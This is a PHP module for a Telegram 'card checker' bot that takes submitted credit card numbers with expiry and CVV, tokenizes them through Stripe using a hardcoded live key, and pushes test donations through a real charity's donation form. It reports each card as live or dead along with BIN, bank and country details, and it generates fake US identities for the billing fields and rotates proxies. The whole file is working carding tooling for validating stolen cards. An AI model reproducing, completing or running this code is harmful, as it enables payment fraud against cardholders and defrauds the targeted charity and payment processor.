<?php
if((strpos($message, '/ch') === 0) or (strpos($message, '.ch') === 0)){
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

if (empty($message)){
    sendMessage($chatId, "<b>
━━━•❅•°•❈ - •°•❅•━━━
● Hey enter a valid CC to check.
● Example: <code>/str 4912685160994312</code>
━━━•❅•°•❈ - •°•❅•━━━
</b>",$message_id);
exit();
}
$lista = substr($message, 4);
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$error = "<b>[⚠️]You're Fine?<i> Give me a valid CC❗</i></b>";
$cc1 = substr($cc, 0, 1);

if((is_numeric($cc)) & (is_numeric($mes)) & (is_numeric($ano))){
$arraycc = ['1', '2', '8', '9'];
if(in_array($cc1, $arraycc)){
        sendMessage($chatId, $error, $message_id);

    exit();
}if(empty($mes) or empty($ano) or empty($cvv)){
  sendMessage($chatId, $error, $message_id); 
  exit();
}
$starttime = microtime(true);
$mytime = 'time1';
if (strpos($message, '/chk@TainuxChk_bot') === 0){
    sendMessage($chatId, "<b>
━━━•❅•°•❈ - •°•❅•━━━
● Hey enter a valid CC to check.
● Example: <code>/ch 4912681604312|02|2024|216</code>
━━━•❅•°•❈ - •°•❅•━━━
</b>",$message_id);
exit();
}
if (empty($cc)) {
sendMessage($chatId, "<b>
🧩Stripe Charge[1$]
STRING: <code>ccs/month/year/cvv ❗</code>️
</b>",$message_id);
exit();
}
$bin = substr($cc, 0, 6);
$last = substr($cc, 11, 5);
//prepaid
 /* $url = 'https://young-badlands-00017.herokuapp.com/?bin='.$cc.'';
$fim = json_decode(file_get_contents($url), true);
  $code = $fim["code"];
    if($level != 'true'){
    sendMessage($chatId,"<b>[⚠️]You're Fine?<i>Enter a valid CC ️</i></b>", $message_id);
    exit();
  }*/

$bin2 = strlen($lista);
if ($bin2 < 6){
sendMessage($chatId, "<b>
━━━•❅•°•❈ - •°•❅•━━━
● Hey enter a valid Bin to check.
● Of more than 5 digits
━━━•❅•°•❈ - •°•❅•━━━
</b>",$message_id);
exit();
}

$sss = sendMessage($chatId,"<b>
Welcome  | TainuxChk 🤖
↳ GateOnly Stripe [💫]⭐🌟✨
━━━━━━━━━━━━━━━━━━━━━
● Card Outcome
 ➥ <code>$lista</code>
● Time Process
➥ {$mytime($starttime)}s □□□□□ 0%[⬛️]♻️🌍🤖
●  Checking
 ➥ <a href='tg://user?id=$userId'>$username</a> $Rank
●  Bot by :- <i>$owner</i>
</b>", $message_id);


//$update = file_get_contents($sss);
$respon = json_decode($sss, true);
$message_id2 = $update["message"]["message_id"]; 
$message_id2 = $message_id2 + 1;
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$namec = "$firstname $lastname";
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
  $namec = "$firstname+$lastname";
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//
//==================[BIN LOOK-UP]======================//
$url = 'https://young-badlands-00017.herokuapp.com/?bin='.$cc.'';
$fim = json_decode(file_get_contents($url), true);
$message = $fim["msg"];
$level = $fim["level"];
$type = $fim["type"];
$brand = $fim["brand"];
$prepaid = $fim["prepaid"];
$country = $fim["country"]["name"];
$currency = $fim["country"]["currency"];
$bank = $fim["bank"]["name"];
$bankurl = $fim["bank"]["site"];
$bankphone = $fim["bank"]["phone"];
$emoji = $fim["country"]["flag"];
$pais = $fim["country"]["ISO2"];
$curl = curl_exec($ch);
/*$brand = strtoupper($brand);
$type = strtoupper($type);
$card = strtoupper($card);
$country = strtoupper($country);*/



  //==================[BIN LOOK-UP-END]======================//
edit_message($chatId,"<b>
Welcome  | TainuxChk 🤖
↳ GateOnly Stripe [💫]⭐🌟✨
━━━━━━━━━━━━━━━━━━━━━
● Card Outcome
 ➥ <code>$lista</code>
● Time Process
➥ {$mytime($starttime)}s ■□□□□ 20%[🟥]♻️🌍🤖
●  Checking
 ➥ <a href='tg://user?id=$userId'>$username</a> $Rank
●  Bot by :- <i>$owner</i>
</b>",$message_id2);

  
  edit_message($chatId,"<b>
Welcome  | TainuxChk 🤖
↳ GateOnly Stripe [💫]⭐🌟✨
━━━━━━━━━━━━━━━━━━━━━
● Card Outcome
 ➥ <code>$lista</code>
● Time Process
➥ {$mytime($starttime)}s ■■□□□ 40%[🟨]♻️🌍🤖
●  Checking
 ➥ <a href='tg://user?id=$userId'>$username</a> $Rank
●  Bot by :- <i>$owner</i>
</b>",$message_id2);

edit_message($chatId,"<b>
Welcome  | TainuxChk 🤖
↳ GateOnly Stripe [💫]⭐🌟✨
━━━━━━━━━━━━━━━━━━━━━
● Card Outcome
 ➥ <code>$lista</code>
● Time Process
 ➥ {$mytime($starttime)}s ■■■□□ 60%[🟧]♻️🌍🤖
●  Checking
 ➥ Proxy :- $statuspro $emojipro
 ➥ <a href='tg://user?id=$userId'>$username</a> $Rank
●  Bot by :- <i>$owner</i>
</b>",$message_id2);

//=======================[1 REQ]==================================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: es-ES,es;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
   ));

# ----------------- [1 req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'time_on_page=261476&guid=afa27a18-844c-4cde-8b4c-28314214bec5a4b450&muid=2bf5c07c-8471-4731-9a41-6181f3e4136aa8fc0c&sid=1d04fc3e-d2c7-4192-828f-85b3e951eef0e2becf&key=pk_live_sjaYzi03SIzRvUcNul47wtec00HcVVNAOe&payment_user_agent=stripe.js%2F78ef418&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$firstname.'+'.$lastname.'');
$result = curl_exec($ch);
$typecc = trim(strip_tags(GetStr($result,'"brand": "','"')));
$id = trim(strip_tags(GetStr($result,'"id": "','"')));
$id2 = trim(strip_tags(GetStr($result,'"id": "card_','"')));
$brandcc = trim(strip_tags(GetStr($result,'"brand": "','"')));
$debitor = trim(strip_tags(GetStr($result,'"funding": "','"')));
$ipclient = trim(strip_tags(GetStr($result,'"client_ip": "','"')));
$created = trim(strip_tags(GetStr($result,'"created": ',',')));
$livemod = trim(strip_tags(GetStr($result,'"livemode": ',',')));

//=======================[1 REQ-END]==============================//
  
edit_message($chatId,"<b>
Welcome  | TainuxChk 🤖
↳ GateOnly Stripe [💫]⭐🌟✨
━━━━━━━━━━━━━━━━━━━━━
● Card Outcome
 ➥ <code>$lista</code>
● Time Process
 ➥ {$mytime($starttime)}s ■■■■□ 80%[🟧]♻️🌍🤖
●  Checking
 ➥ Proxy :- $statuspro $emojipro
 ➥ <a href='tg://user?id=$userId'>$username</a> $Rank
●  Bot by :- <i>$owner</i></b>",$message_id2);


//=======================[2 REQ]==================================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.wsup.com/donate/');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.wsup.com',
'method: POST',
'path: /donate/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: es-ES,es;q=0.9',
'content-type: multipart/form-data; boundary=----WebKitFormBoundary3KfZgi2YodrBAtVl',
'cookie: moove_gdpr_popup={"strict":"1","thirdparty":"1","advanced":"1","version":"1"}; _ga=GA1.2.1695491939.1652216588; _gid=GA1.2.1259053981.1652216588; __stripe_sid=1d04fc3e-d2c7-4192-828f-85b3e951eef0e2becf; __stripe_mid=2bf5c07c-8471-4731-9a41-6181f3e4136aa8fc0c; hd-form-popup-waterampsanitationfortheurbanpoor=true',
'origin: https://www.wsup.com',
'referer: https://www.wsup.com/donate/',
'sec-fetch-dest: iframe',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'upgrade-insecure-requests: 1',
'user-agent: MMozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_1"

monthly
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_2"

£5
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_3.1"

Monthly donation
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_3.2"

£ 5.00
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_3.3"

1
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_13.3"

'.$firstname.'
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_13.6"

'.$lastname.'
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_14"

'.$email.'
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_15.1"

'.$street.'
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_15.2"


------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_15.3"

'.$city.'
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_15.4"

'.$state.'
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_15.5"

'.$zip.'
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_15.6"

United States
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="input_21.1"

Gift Aided
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="gform_ajax"

form_id=7&title=&description=&tabindex=0
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="is_submit_7"

1
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="gform_submit"

7
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="gform_unique_id"

627ad3a986468
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="state_7"

WyJ7XCIzLjFcIjpcIjJlMmE0YzE1NDAzMzY4YjRkYTJmYmZmYjAwZTA2MDJlXCIsXCIzLjJcIjpcImY5MmRjNjMwODgzZGE1ZmM1OGVmMzk1MjQxYzRiYzc2XCIsXCI0LjFcIjpcIjJlMmE0YzE1NDAzMzY4YjRkYTJmYmZmYjAwZTA2MDJlXCIsXCI0LjJcIjpcImRmOTlkMWY4MTNmYTMzNzBhYTU4MTNmNjFiYzMyYTE1XCIsXCI1LjFcIjpcIjJlMmE0YzE1NDAzMzY4YjRkYTJmYmZmYjAwZTA2MDJlXCIsXCI1LjJcIjpcImJhZDNhN2E0ZGNjYTcwZTk4ODk0YjE5OTJjNjc0M2E2XCIsXCI3LjFcIjpcIjM4MTBjMDhkYTA2OGY1NDU2MTc2MGE4OTVmOGJjOGI1XCIsXCI3LjJcIjpcImRmOTlkMWY4MTNmYTMzNzBhYTU4MTNmNjFiYzMyYTE1XCIsXCI4LjFcIjpcIjM4MTBjMDhkYTA2OGY1NDU2MTc2MGE4OTVmOGJjOGI1XCIsXCI4LjJcIjpcIjExMzQyNDlhMzlmODU3ZDkxNDRjMDIwODc5N2ZjYmY0XCIsXCI5LjFcIjpcIjM4MTBjMDhkYTA2OGY1NDU2MTc2MGE4OTVmOGJjOGI1XCIsXCI5LjJcIjpcIjE2YTFkZmM2NjZhYTRmMWU5MWM0YTZlOGVkZjY0YTVmXCJ9IiwiYjk5N2E2NmRlYTQyMTk3ZGUxMWE0MDdhMWI3ODdmN2YiXQ==
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="gform_target_page_number_7"

0
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="gform_source_page_number_7"

3
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="gform_field_values"


------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="stripe_credit_card_last_four"

'.$last.'
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="stripe_credit_card_type"

'.$typecc.'
------WebKitFormBoundary3KfZgi2YodrBAtVl
Content-Disposition: form-data; name="stripe_response"

{"id":"'.$id.'","object":"token","card":{"id":"'.$id2.'","object":"card","address_city":null,"address_country":null,"address_line1":null,"address_line1_check":null,"address_line2":null,"address_state":null,"address_zip":null,"address_zip_check":null,"brand":"'.$brandcc.'","country":"US","cvc_check":"unchecked","dynamic_last4":null,"exp_month":'.$mes.',"exp_year":'.$ano.',"funding":"'.$debitor.'","last4":"'.$last.'","name":"'.$namec.'","tokenization_method":null},"client_ip":"'.$ipclient.'","created":'.$created.',"livemode":'.$livemod.',"type":"card","used":false}
------WebKitFormBoundary3KfZgi2YodrBAtVl--');

 $result1 = curl_exec($ch);


$message = trim(strip_tags(GetStr($result1,'<strong>','</strong><br />')));
$code = trim(strip_tags(GetStr($result1,'"decline_code": "','"')));
$payment = trim(strip_tags(GetStr($result1,'"last_payment_error": ',',')));

//"last_payment_error": null,

  //$idcustomer = trim(strip_tags(GetStr($resultcustomer,'"id":"','"')));

//=======================[CUSTOM REQ END]==================================//

//=======================[MADE BY]==============================//

$made = "<code>Anton1o_x</code>";

//=======================[MADE BY]==============================//
 edit_message($chatId,"<b>
Welcome  | TainuxChk 🤖
↳ GateOnly Stripe [💫]⭐🌟✨
━━━━━━━━━━━━━━━━━━━━━
● Card Outcome
 ➥ <code>$lista</code>
● Time Process
 ➥ {$mytime($starttime)}s ■■■■■ 100%[🟩]♻️🌍🤖
●  Checking
 ➥ Proxy :- $statuspro $emojipro
 ➥ <a href='tg://user?id=$userId'>$username</a> $Rank
●  Bot by :- <i>$owner</i></b>",$message_id2);
//=======================[Responses]==============================//
# - [CVV Responses ] - #

if ((strpos($result, '"cvc_check":"pass"')) || (strpos($result, "Thank You.")) || (strpos($result, 'Your card zip code is incorrect.')) || (strpos($result, "Thank You For Donation.")) || (strpos($result, "incorrect_zip")) || (strpos($result, "Success ")) || (strpos($result, '"type":"one-time"')) || (strpos($result, "/donations/thank_you?donation_number="))){
$status08 = 'LIVE CVV';
$response08 = 'Thank You For Donation.';
$emojit = $emojil;
}
elseif (strpos($result, 'result":"success","redirect":')){
$status08 = 'LIVE CVV';
$response08 = 'Thank You For Donation.';
$emojit = $emojil;
}

elseif ((strpos($result, "Your card has insufficient funds.")) || (strpos($result, '"cvc_check": "fail"'))){
$status08 = 'LIVE CVV';
$response08 = 'Your card has insufficient funds.';
$emojit = $emojil;
}
# - [CVV Responses ] - #


# - [CCN Responses ] - #

elseif ((strpos($result, 'security code is incorrect.')) || (strpos($result, "security code is invalid.")) || (strpos($result, "Your card's security code is incorrect.")) || (strpos($result, "incorrect_cvc"))){
$status08 = 'LIVE CCN';
//$message = "Card Authorized.";
$emojit = $emojil;
    
}

#-[CCN Responses END ]- #



#- [Stolen,Lost,Pickup Responses]- #

elseif ((strpos($result, 'stolen_card')) || (strpos($result, "lost_card")) || (strpos($result, "pickup_card."))){
    $status08 = 'DEAD';
$response08 = 'Pickup or lost card';
$emojit = $emojid; 
    
}

# -[Reprovada,Decline Responses ] - #

elseif ((strpos($result, 'card was declined')) || (strpos($result1, "generic_decline")) || (strpos($result, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result, "processing_error")) || (strpos($result, "parameter_invalid_empty")) || (strpos($result, 'lock_timeout')) || (strpos($result, "transaction_not_allowed"))){
$status08 = 'DEAD';
$response08 = 'do_not_honor';
$emojit = $emojid; 
    
}
elseif (strpos($result1, 'Your card number is incorrect.')){
$status08 = 'DEAD';
//$message = 'The card number is incorrect.';
$emojit = $emojid; 
    
}
elseif (strpos($message, "Your card has expired.")){
$status08 = 'DEAD';
//$message = 'The card expiration month is invalid';
$emojit = $emojid; 
    
}
elseif (strpos($code, "invalid_account")){
$status08 = 'DEAD';
$message = 'Invalid account.';
$emojit = $emojid; 
    
}
  elseif (strpos($result1, "Your card's expiration month is invalid")){
$status08 = 'DEAD';
//$message = 'The card expiration month is invalid';
$emojit = $emojid; 
    
}
elseif (strpos($result1,  "Your card's expiration year is invalid.")) {
$status08 = 'DEAD';
//$message = 'Your card has expired.';
$emojit = $emojid; 
    
}

elseif (strpos($result, "You have exceeded the maximum number of declines on this card in the last 24 hour period. Please contact us via https://support.stripe.com/contact if you need further assistance.")) {
$status08 = 'DEAD';
$message = 'card_decline_rate_limit_exceeded';
$emojit = $emojid; 
    
}
//

elseif (strpos($result, "Your card does not support this type of purchase.")){
$status08 = 'DEAD';
$response08 = 'Generic decline.';
$emojit = $emojid; 
    
}
elseif (strpos($result, "Your card number is incorrect.")){
$status08 = 'DEAD';
//$message = 'Incorrect card number';
$emojit = $emojid; 
    
}


elseif ((strpos($result, 'card was declined')) || (strpos($result1, "generic_decline")) || (strpos($result, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result, "processing_error")) || (strpos($result, "parameter_invalid_empty")) || (strpos($result, 'lock_timeout')) || (strpos($result, "transaction_not_allowed"))){
    $status08 = 'DEAD';
$response08 = 'Your card was declined.';
$emojit = $emojid; 
    
}

elseif($payment == 'null'){
    $status08 = 'DEAD';
    $message = '3D lookup Enrolled';
}

# - [Reprovada,Decline Responses END ] - #



# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] - #


elseif(strpos($result1,  '-1')){
$status08 = 'DEAD';
//$message = 'Gateway or IP dead';
$emojit = $emojid; 
}
/*
else{
$status08 = 'DEAD';
$response08 = 'Unknown Error';
$emojit = $emojid;
    
}
else{
$status08 = 'DEAD';
$message = 'Gateway or IP dead2';
$emojit = $emojid; 
}*/
if($statuspro == 'DEAD'){
$status08 = 'DEAD';
$response08 = 'IP dead';
$emojit = $emojid; 
}
if($status08 == 'DEAD'){
$status08230 = "Declined [$emojid]";
}else{
$status08230 = "Approved! [$emojil]";
}

  $extra = str_pad(substr($cc, 0,12), 16, "x");

edit_message($chatId,
"<b>
>_. Stripe[Charge 5$] Gateway ❤️‍🔥
━━━━━━━━━━━━━━━
$ Input ➜ <code>$lista</code>
$ Status ➜ <code>$status08230</code>
$ Reponse ➜ <code>$message</code>

∆ Bin ➜ <code>$bin [$emoji]</code>
∆ Country ➜ <code>$country($pais) ~ $currency</code>
∆ Info ➜ <code>$brand ~ $type ~ $level</code>
∆ Bank ➜ <code>$bank</code>
━━━━━━━━━━━━━━━
Time ➜ <code>{$mytime($starttime)}s</code>
User ➜ <a href='tg://user?id=$userId'>$username</a> $Rank
By ➜ <code>$owner</code>
</b>",$message_id2); 


}
curl_close($ch);
ob_flush();
}else{
    sendMessage($chatId, $error, $message_id);
}
}



//• Proxy -» $statuspro $emojipro

////////CHK END COMMAND///////////


?>